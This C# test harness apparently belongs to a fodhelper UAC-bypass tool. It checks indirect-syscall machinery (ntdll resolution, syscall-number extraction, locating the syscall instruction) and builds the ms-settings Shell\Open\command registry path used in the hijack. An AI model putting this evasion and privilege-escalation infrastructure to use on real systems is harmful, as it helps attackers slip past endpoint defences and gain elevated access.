using System;
using System.Runtime.InteropServices;

namespace FODHelperUACBypass_NG
{
    public static class TestSyscalls
    {
        public static void RunTests()
        {
            Console.WriteLine("[*] Testing indirect syscall infrastructure...\n");

            // Test 1: Can we get ntdll base?
            Console.WriteLine("[TEST 1] Getting ntdll base address...");
            try
            {
                var ntdllBase = typeof(Native).GetMethod("GetNtdllBase", 
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                if (ntdllBase != null)
                {
                    IntPtr result = (IntPtr)ntdllBase.Invoke(null, null);
                    Console.WriteLine($"[+] ntdll.dll base: 0x{result.ToInt64():X}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed: {ex.Message}");
            }

            // Test 2: Can we resolve NtClose?
            Console.WriteLine("\n[TEST 2] Resolving NtClose function...");
            try
            {
                var getFunctionAddress = typeof(Native).GetMethod("GetFunctionAddress",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                if (getFunctionAddress != null)
                {
                    IntPtr result = (IntPtr)getFunctionAddress.Invoke(null, new object[] { "NtClose" });
                    Console.WriteLine($"[+] NtClose address: 0x{result.ToInt64():X}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed: {ex.Message}");
            }

            // Test 3: Can we get SSN for NtClose?
            Console.WriteLine("\n[TEST 3] Extracting syscall number for NtClose...");
            try
            {
                var getFunctionAddress = typeof(Native).GetMethod("GetFunctionAddress",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                var getSyscallNumber = typeof(Native).GetMethod("GetSyscallNumber",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                
                if (getFunctionAddress != null && getSyscallNumber != null)
                {
                    IntPtr funcAddr = (IntPtr)getFunctionAddress.Invoke(null, new object[] { "NtClose" });
                    uint ssn = (uint)getSyscallNumber.Invoke(null, new object[] { funcAddr });
                    Console.WriteLine($"[+] NtClose SSN: 0x{ssn:X}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed: {ex.Message}");
            }

            // Test 4: Can we find syscall instruction?
            Console.WriteLine("\n[TEST 4] Finding syscall instruction for NtClose...");
            try
            {
                var getFunctionAddress = typeof(Native).GetMethod("GetFunctionAddress",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                var findSyscallInstruction = typeof(Native).GetMethod("FindSyscallInstruction",
                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
                
                if (getFunctionAddress != null && findSyscallInstruction != null)
                {
                    IntPtr funcAddr = (IntPtr)getFunctionAddress.Invoke(null, new object[] { "NtClose" });
                    IntPtr syscallAddr = (IntPtr)findSyscallInstruction.Invoke(null, new object[] { funcAddr });
                    Console.WriteLine($"[+] syscall instruction at: 0x{syscallAddr.ToInt64():X}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed: {ex.Message}");
            }

            // Test 5: Test NtDelayExecution (sleep)
            Console.WriteLine("\n[TEST 5] Testing NtDelayExecution (sleep 1 second)...");
            try
            {
                DateTime start = DateTime.Now;
                Helpers.Sleep(1000);
                TimeSpan elapsed = DateTime.Now - start;
                Console.WriteLine($"[+] Slept for {elapsed.TotalMilliseconds:F0}ms");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed: {ex.Message}");
            }

            // Test 6: Test registry path construction
            Console.WriteLine("\n[TEST 6] Testing registry path construction...");
            try
            {
                string testPath = @"Software\Classes\ms-settings\Shell\Open\command";
                string ntPath = Helpers.GetCurrentUserRegistryPath(testPath);
                Console.WriteLine($"[+] NT path: {ntPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed: {ex.Message}");
            }

            Console.WriteLine("\n[*] Tests complete.\n");
        }
    }
}
